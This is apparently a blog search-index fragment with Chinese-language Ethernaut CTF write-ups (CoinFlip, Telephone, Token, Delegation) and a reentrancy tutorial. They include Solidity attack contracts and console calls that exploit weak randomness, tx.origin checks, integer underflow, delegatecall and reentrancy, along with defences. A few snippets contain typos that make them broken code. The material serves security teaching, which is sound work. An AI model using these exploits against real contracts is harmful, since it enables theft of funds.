&#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约是一个“掷硬币猜正反”的游戏，要求连续猜对10次极为通关。<br/><br>先来分析一下合约：<br><code>block.number</code>可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而<code>blockhash(id)</code>可以获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor就是<code>2^{256}/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。<br>这里补充一下几个知识：</p><ul><li><p>补充</p><ul><li><strong>Solidity block对象</strong><br>block.coinbase (address): 当前块的矿工的地址<br>block.difficulty (uint):当前块的难度系数<br>block.gaslimit (uint):当前块gas的上限<br>block.number (uint):当前块编号<br>block.blockhash (function(uint) returns (bytes32)):函数，返回指定块的哈希值，已经被内建函数blockhash所代替<br>block.timestamp (uint):当前块的时间戳</li></ul><p><br/></p><ul><li><p><strong>Revert</strong><br>revert是solidity中的一种错误处理机制，<br>而revert一旦触发，会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。<br>revert由两种使用形式：</p><ul><li>revert ：<code>revert CustomError（arg1， arg2）;</code>该语句将自定义错误作为不带括号的直接参数</li><li>revert() ：<code>revert（）;revert（“description”）;</code>出于向后兼容的原因，还有一个函数，它使用括号并接受字符串</li></ul><p><br/></p></li><li><p><strong>Revert与Require与Assert</strong></p><ul><li>Assert： 可以理解为严厉一点的判断，如果判断失败，将会burn掉你的gas</li><li>Require: 可以理解为温和一点的判断，就算判断失败，gas会返回给调用者</li><li>Revert ：revert的用法和throw很像，也会撤回所有的状态转变。但是它有两点不同：<ol><li>它允许你返回一个值</li><li>它会把所有剩下的gas退回给caller</li></ol></li></ul></li></ul><p>详情参见<a href="https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement" target="_blank" rel="noopener">solidity参考文档</a><br><br/></p></li><li><p>漏洞分析：<br>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p><blockquote><p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的<code>block.number.sub(1)</code>是一样的。</p></blockquote><p>其实就是利用了一个区块中可能由多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的<br><br/></p><p>攻击合约代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;CoinFlip.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  address adr &#x3D; 0xFd288CbD59B3f74A70B10730a076Ad0b59479C56;&#x2F;&#x2F;被攻击合约地址</span><br><span class="line">  CoinFlip coin &#x3D; CoinFlip(adr);</span><br><span class="line"></span><br><span class="line">  function dosome() public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">    coin.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署成功后只需要执行10次<code>dosome</code>方法即可</p><blockquote><p>我试过编写一个函数用一个for循环来控制<code>dosome()</code>执行的次数，最终以失败告终，应该是由于循环多了之后造成gas超过了gaslimit的上限。<br>解题步骤：</p></blockquote></li></ul><ol><li>将我们的攻击合约部署在测试链上</li><li>执行10次<code>dosome()</code>函数</li><li>通关<br><img src="../images/ethernaut/e03/01.png" alt=""></li></ol><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>此题考查<code>tx.origin</code>和<code>msg.sender</code>的区别。没有什么难点<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求获得合约所有权，可以看到只要满足<code>tx.origin != msg.sender</code>就行。在此介绍一下<code>tx.origin</code>：</p><blockquote><p>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。</p></blockquote><p><strong>在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</strong><br/><br>因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。</p><blockquote><p>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者</p></blockquote><ul><li><p>漏洞分析<br>在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone t;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        t &#x3D; Telephone(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>总结：<br>tx.origin不应该用于智能合约的授权。更多的时候采用<code>msg.sender == owner</code>来进行判断。<br/><br>但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用<code>require（tx.origin ==msg.sender）</code>来进行实现。</li></ul><h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>这是一个整数溢出的漏洞<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这个合约没有用到<code>SafeMath</code>那么我们就要格外关注是否存在整数溢出型的漏洞。<br>不出意外：在transfer方法中<code>require(balances[msg.sender] - _value &gt;= 0)</code>使明显存在整数下溢的风险的。<br/><br>由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，<code>_value&gt;20</code>即可使<code>balances[msg.sender] - _value</code> 发生下溢变成一个很大的值从而符合判定条件。</p><ul><li>解题思路</li></ul><ol><li>在控制台调用transfer方法value为21即可<br><img src="../images/ethernaut/e05/01.png" alt=""></li><li>此时查看我们的账户余额已经是一个相当大的值<br><img src="../images/ethernaut/e05/02.png" alt=""></li><li>通关</li></ol></li></ul><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>这道题考查对delegatecall()的认识<br>非常危险<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过<code>Delegation</code>合约调用<code>Delegate</code>中的<code>pwn()</code>函数，即可完成对<code>owner</code>的修改</p><ul><li>漏洞分析<br>我们注意到<code>Delegation</code>中的fallback()函数有<code>address(delegate).delegatecall(msg.data);</code>出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/><br>我们在这道题当中只需要给<code>Delegation</code>合约转账，触发他的<code>fallback</code>函数并通过函数签名的方式传入<code>data</code>即可</li></ul><p>解题步骤：</p><ol><li>执行<code>contract.sendTransaction({data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)});</code>给当前合约赚一笔帐并指定data<br><img src="../images/ethernaut/e06/01.png" alt=""></li><li>通关</li></ol>]]></content>
      
      
      <categories>
          
          <category> ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReentryAttack</title>
      <link href="/2022/06/15/ReentryAttack/"/>
      <url>/2022/06/15/ReentryAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p><ul><li><strong>发生条件</strong><ol><li>调用了外部的合约且该合约是不安全的</li><li>外部合约的函数调用早于状态变量的修改</li></ol></li></ul><p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识</code></pre><ul><li>以太坊常用的转账的方法<ol><li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li><li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li><li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li></ol></li><li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  回退函数在以下几种情况中被执行：</p><ol><li>调用合约时没有匹配到任何一个函数</li><li>没有传数据</li><li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li></ol></li><li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="./ReentryAttack/Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p><ul><li>攻击者思路：<blockquote><ol><li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li><li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li></ol></blockquote></li><li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="./ReentryAttack/Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="./ReentryAttack/Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="./ReentryAttack/Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="./ReentryAttack/Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="./ReentryAttack/Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="./ReentryAttack/Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="./ReentryAttack/Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="./ReentryAttack/Reenter9.png" alt=""></li></ul></li></ul><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul><li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p></li><li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
